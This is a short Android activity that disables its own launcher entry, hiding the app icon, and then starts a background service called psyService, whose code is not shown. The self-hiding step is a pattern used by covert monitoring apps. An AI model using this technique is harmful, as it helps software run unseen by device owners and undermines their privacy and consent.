package com.example.ysp;

import android.os.Bundle;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;

public class MainActivity extends Activity {
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		
		PackageManager p = getPackageManager();
	     p.setComponentEnabledSetting(getComponentName(),PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
	     finish(); 
		Intent intent=new Intent(MainActivity.this,psyService.class);
		startService(intent);
	}
}
